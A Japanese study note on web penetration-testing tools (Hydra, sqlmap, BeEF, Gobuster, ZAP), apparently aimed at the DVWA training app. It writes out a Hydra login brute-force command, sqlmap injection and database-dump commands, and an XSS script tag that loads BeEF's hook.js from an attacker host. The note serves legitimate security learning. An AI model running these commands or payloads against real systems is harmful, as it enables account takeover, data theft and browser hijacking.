# ツールの使用

* Hydra
  1. 様々なプロトコルに対応したBruteForce Attackツール
  2. ワードリスト　`/usr/share/wordlists/metasploit`
  3. コマンド例

  ``` shell
      hydra 192.168.XXX.XXX -s 80 -l gordonb -P /usr/share/wordlists/metasploit/burnett_top1024.txt http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie: PHPSESSID=セッションID;security=low:F=Username and/or password incorrect."
  ```

| command                                                  | summary                                     |
| -------------------------------------------------------- | ------------------------------------------- |
| Hydra                                                    | hydraコマンド                               |
| `192.168.XXX.XXX -s 80`                                   | webアプリのアドレスとポート                 |
| `-l gordonb`                                             | パスワードリスト                            |
| `-P /usr/share/wordlists/metasploit/burnett_top1024.txt` | パスワードリスト                            |
| `/vulnerabilities/brute/`                                | リクエスト先のリソース                      |
| `:username=^USER^&password=^PASS^&Login=Login`           | クエリストリングの^USER^,^PASS^が変数に相当 |
| `:H=Cookie: PHPSESSID=セッションID;security=low`         | リクエストのヘッダ(Cookie)                  |
| `:F=Username and/or password incorrect."`                | ログイン失敗時のメッセージ |

* sqlmap
  1. SQLインジェクションの脆弱性診断ツール
  2. コマンド
     1. BurpSuiteでSQL操作時のリクエストを観測 GETリクエストとCookieでセッションIDを保持しているか。
     2. help `sqlmap -h`
     3. コマンド例 `sqlmap -u "http://URL/vulnerbilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=...; security=low"`
     4. `--dump`でデータベースをダンプ可能
     5. `--data`POSTで実行できる

* BeEF
  1. ブラウザ向けの脆弱性を検証するツール(XSS)
  2. メニューから`Beef start`を選択
  3. XSSでBeEFのスクリプトを実行させて制御を奪う
      `<script src=http://攻撃端末のIPアドレス:3000/hook.js></script>`
  
* Gobuster
  1. WebサイトのURLやDNSサブドメイン名を洗い出すツール
  2. コマンド例
      `gobuster dir -u WebアプリのIP -w /usr/share/seclists/Discovery/Web-Content/common.txt -s '200,204,301,302,307,403,500' -b '' -e`
  3. モード
     1. dir: ディレクトリを列挙するモード
     2. dns: DNSのサブドメインを列挙するモード
     3. vhost: WebサーバのVirtualHostを列挙するモード
  4. オプション
     1. -u: 探索を行う起点のURLを指定する。指定したURLをサブディレクトリを探索させることができる。
     2. -w: ワードリスト(wordlist)の指定、ここで指定したファイルにある文字列を-uで指定したURLに一行ずつくっつけて探索
     3. -s: どのステータスコードが返ってきたらアクセスしたURLが存在すると判定するかを指定できる。
     4. -b: どのステータスコードが返ってきたらアクセスしたURLが存在しないと判定するかを指定できる。(-sを指定した場合は-b ''を指定する必要がある)
     5. -x: 検索するファイル拡張子(dirモードのみ有効) php、txt、htmlファイルを検索したい場合のコマンド例:-x 'php,txt,html'
     6. -e: 見つかったURLの表示に-uで指定したベースのURLを含めて表示する(expand)

* ZAP(Zed Attack Proxy)
  1. プロキシを用いたWebアプリ用の脆弱性診断ツール
  2. 主要機能
     1. スパイダー機能
     2. 動的スキャン機能
     3. ローカルプロキシ機能
     4. ディレクトリ探索機能
     5. アラート機能
     6. ZAP Script機能
  3. 手順
     1. 起動 `zaproxy`
     2. zapウィンドウからfirefoxを起動
     3. firefoxのsettingから`manual proxy configuration`を選択　`HTTP proxy:localhost  Port:8080`
     4. webにアクセス　zapウィンドウ内のサイトに追加される
     5. スキャンモードを`プロテクトモード`にする。
     6. スキャンするURLをコンテキストに追加
     7. スキャンの実行 `攻撃　->　動的スキャン`
